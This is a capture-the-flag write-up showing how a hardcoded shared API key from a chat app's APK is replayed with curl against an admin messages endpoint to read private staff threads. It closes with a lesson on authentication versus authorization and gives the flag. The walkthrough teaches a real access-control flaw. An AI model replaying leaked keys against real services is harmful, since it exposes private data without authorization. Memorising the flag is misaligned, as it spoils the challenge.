# Whispers in the Wire

> The WhisperChat APK ships a shared API key that is accepted by the admin message endpoint. Replaying the key returns every private staff thread.
> **Flag:** `flag{27d7845410746b54}`

---

## Solution

### 1. Unpack the client

```bash
$ 7z x -pinfected public.zip -o whispers/
```

The archive contains the decompiled APK and a Python client. Both hardcode the
same key:

```text
API_KEY = "fluidctf-api-2026-whispers"
```

### 2. Find the endpoint

`WhisperApi.java` declares:

```text
GET /api/admin/messages
```

with a comment that gives the bug away:

> Admin console feed: every channel, including private staff threads. Reached
> from SettingsActivity only when the account is staff, but the call carries the
> same shared API key as everything else.

`SettingsActivity.java` confirms it:

> the backend never checks anything beyond the shared API key, so the route it
> opens is reachable by anyone replaying that key.

### 3. Replay the key

```bash
$ curl -s \
  -H "X-API-Key: fluidctf-api-2026-whispers" \
  -H "User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)" \
  https://85bdf22e272874f9.chal.ctf.ae/api/admin/messages
```

The endpoint returns five messages from the private `ops` thread. The first one
carries the flag:

```text
sender: admin -> recipient: ops
body: "Vault recovery code for Q2: flag{27d7845410746b54}"
```

### 4. Flag

```text
flag{27d7845410746b54}
```

## Lesson

A shared API key is authentication, not authorization. If the client uses the same
key for user and staff actions, and the server only checks the key, every role
check on the client side is decorative.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
